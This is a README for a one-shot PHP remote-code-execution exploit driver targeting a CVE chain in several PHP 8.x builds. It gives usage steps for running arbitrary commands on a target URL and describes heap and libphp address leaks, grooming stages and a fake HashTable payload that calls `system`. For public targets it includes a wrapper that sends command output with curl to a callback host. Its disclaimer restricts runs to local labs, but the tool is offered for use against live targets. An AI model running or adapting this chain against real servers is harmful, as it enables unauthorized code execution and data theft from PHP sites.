# Multi-build one-shot driver

`exploit.py` is the URL-only driver for the engine-level
CVE-2026-109618/109619 chain. It carries calibrated profiles for
**8.2.34**, **8.3.29**, **8.3.35**, and **8.4.26** (stock
`php.ini-production`, 128M), and gates fixed releases (`8.2.35+`,
`8.3.36+`, `8.4.27+`, `8.5.12+`) as not vulnerable before sending a chain
request.

## Usage

Start a lab target, then run the driver and paste its URL:

```bash
cd ../lab-8234       # or ../lab-8329, ../lab-8335, ../official-lab
./run.sh
cd ../oneshot-8426
python3 exploit.py
# target: http://127.0.0.1:18134/index.php
# id
# uname -sr
# exit
```

The first line is the URL. Every following line is one full chain run; the
first automated run is the proof (`id` by default). The driver selects the
profile from the `X-Powered-By` banner, leaks the heap and `libphp` bases
on every command, and uses the per-build A1/B1/A2/B2 geometry.

## Output channels

- Loopback/private target: `/out` proof-file channel, enabled by the lab
  `run.sh` mount.
- Public target: built-in OOB listener; the command is wrapped as
  `(cmd) >/tmp/.p2s 2>&1; curl --data-binary @/tmp/.p2s http://<callback>/`.
  Inbound reachability is the operator's responsibility.

Local labs are the only validated targets in this repository. The driver
does not ship a target list and does not discover targets. 8.5.11 is not in
the profile set; that calibration is parked (see [`../VERSIONS.md`](../VERSIONS.md)).

## Files

| File | Contents |
|---|---|
| `exploit.py` | URL-only driver, banner gate, profile selection, OOB listener |
| `pure_shell.py` | Engine, request senders, A1/B1/A2/B2 orchestration, leak parser |
| `multi_worker.py` | Bounded-pool wave/retry orchestration |
| `payloads/mk_a1.py` | A1 builder (END-cleanup `send_cookie` OOM) |
| `payloads/mk_leak_b.py` | B1 builder (`G/F/A/S/P/X` specs, page forge) |
| `payloads/cheap_oom_a.py` | A2 cheap-OOM grooming |
| `payloads/fake_ref_b.py` | B2 fake-reference carrier |
| `payloads/mk_ht.py` | Fake HashTable / `zif_system` payload |
| `payloads/chunked_send.py` | Standalone chunked sender |
| `run.sh`, `docker/` | 8.4.26 lab target |

## Limits

- Single-worker lab: one chain per request; the URL-only driver works on
  one child.
- Multi-worker pools: use `pure_shell.py --multi` with the wave settings
  documented in `../official-lab/`; the one-shot driver's profile path is
  single-worker.
- The leak needs the target to return the large `Set-Cookie` header; a
  CDN/reverse proxy with a small header limit will break B1.
- Command length is bounded by the carrier/transport wrapper (`CMD_LIMIT`
  in `pure_shell.py`); use a script or `sh</out/c` for longer commands in
  the lab.

All runs are local Docker only. Do not point this at a host you are not
authorized to test.
